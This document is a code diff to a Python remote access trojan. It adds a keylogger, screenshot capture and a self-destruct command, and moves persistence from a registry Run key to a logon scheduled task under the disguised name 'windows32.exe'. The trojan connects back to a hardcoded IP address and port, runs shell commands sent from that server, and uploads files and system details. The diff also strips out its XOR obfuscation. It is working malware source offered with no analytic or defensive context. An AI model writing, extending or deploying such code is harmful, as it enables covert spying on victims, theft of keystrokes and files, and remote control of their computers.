@@ -6,80 +6,96 @@ import time
 import platform
 import base64
 import shutil
-from itertools import cycle
+import pyautogui
+from pynput import keyboard
 
-# Function to establish persistence
 def persist():
     file_location = os.path.join(os.environ["appdata"], "windows32.exe")
     if not os.path.exists(file_location):
         shutil.copyfile(sys.executable, file_location)
-        subprocess.call(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Windows32 /t REG_SZ /d "{file_location}"', shell=True)
+        subprocess.call(f'schtasks /create /sc onlogon /tn "Windows32" /tr "{file_location}"', shell=True)
 
-# Function to encrypt/decrypt communication
-def encrypt_decrypt(data, key='secretkey'):
-    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(data, cycle(key)))
+def on_press(key):
+    with open(os.path.join(os.environ["appdata"], "keylogs.txt"), "a") as f:
+        try:
+            f.write(f"{key.char}")
+        except AttributeError:
+            if key == keyboard.Key.space:
+                f.write(" ")
+            elif key == keyboard.Key.enter:
+                f.write("\n")
+            elif key == keyboard.Key.backspace:
+                f.write("[BACKSPACE]")
+            else:
+                f.write(f"[{key.name}]")
 
-# Function to handle commands from the server
+def start_keylogger():
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+
+def capture_screenshot():
+    screenshot = pyautogui.screenshot()
+    screenshot_path = os.path.join(os.environ["appdata"], "screenshot.png")
+    screenshot.save(screenshot_path)
+    with open(screenshot_path, "rb") as f:
+        return base64.b64encode(f.read())
+
+def self_destruct():
+    file_location = os.path.join(os.environ["appdata"], "windows32.exe")
+    os.remove(file_location)
+    subprocess.call('schtasks /delete /tn "Windows32" /f', shell=True)
+    sys.exit()
+
 def command_handler(s):
     while True:
         try:
-            # Receive and decrypt command
-            command = encrypt_decrypt(s.recv(2048).decode())
+            command = s.recv(2048).decode()
             if command.lower() == "exit":
                 break
             elif command.lower() == "sysinfo":
-                # Gather and send system information
                 sysinfo = f"OS: {platform.system()} {platform.release()}\n"
                 sysinfo += f"Hostname: {socket.gethostname()}\n"
                 sysinfo += f"User: {os.getlogin()}\n"
-                s.send(encrypt_decrypt(sysinfo).encode())
+                s.send(sysinfo.encode())
             elif command.lower().startswith("download"):
-                # Extract file path and send the file
                 _, file_path = command.split("*")
                 if os.path.exists(file_path):
                     with open(file_path, "rb") as f:
                         s.send(base64.b64encode(f.read()))
                 else:
-                    s.send(encrypt_decrypt("File not found.").encode())
+                    s.send("File not found.".encode())
             elif command.lower().startswith("upload"):
-                # Extract file path and receive the file
                 _, file_path = command.split("*")
                 with open(file_path, "wb") as f:
                     file_data = s.recv(5000)
                     f.write(base64.b64decode(file_data))
-                s.send(encrypt_decrypt("File uploaded successfully.").encode())
+                s.send("File uploaded successfully.".encode())
+            elif command.lower() == "screenshot":
+                s.send(capture_screenshot())
+            elif command.lower() == "selfdestruct":
+                self_destruct()
             else:
-                # Execute command
                 output = subprocess.getoutput(command)
                 if not output:
                     output = "Command executed."
-                # Send encrypted output
-                s.send(encrypt_decrypt(output).encode())
+                s.send(output.encode())
         except Exception as e:
-            # Handle potential errors
-            s.send(encrypt_decrypt(f"Error: {str(e)}").encode())
+            s.send(f"Error: {str(e)}".encode())
             continue
 
-# Main function
 def main():
-    # Establish persistence
     persist()
+    start_keylogger()
 
-    # Create a socket object
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    # Keep trying to connect to the attacker's server
     while True:
         try:
             s.connect(("159.65.152.59", 7777))
             break
         except:
-            time.sleep(5)  # Wait before trying to connect again
+            time.sleep(5)
 
-    # Start the command handler
     command_handler(s)
-
-    # Close the connection
     s.close()
 
 if __name__ == "__main__":
